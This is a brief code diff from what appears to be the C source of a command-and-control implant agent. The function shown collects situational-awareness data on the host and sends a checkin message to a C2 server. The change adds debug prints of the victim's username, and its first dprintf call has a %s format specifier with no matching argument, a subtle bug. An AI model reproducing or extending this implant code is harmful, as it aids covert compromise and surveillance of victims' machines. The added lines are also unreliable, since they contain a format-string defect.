@@ -42,6 +42,11 @@ void perform_checkin(AgentParams *params, AgentCapabilities *cap, HttpHandle *ht
 	
 	// Use the checkin PICO to gather basic situational awareness info, if possible.
 	cap->CheckinPicoEntrypoint(&checkin);
+	if (checkin.username != NULL) {
+		dprintf("TEMP: Username is %s");
+	} else {
+		dprintf("TEMP: Could not retrieve username");
+	}
 	
 	// Send checkin payload to C2 server.
 	char *msg = generate_checkin_message(&checkin);
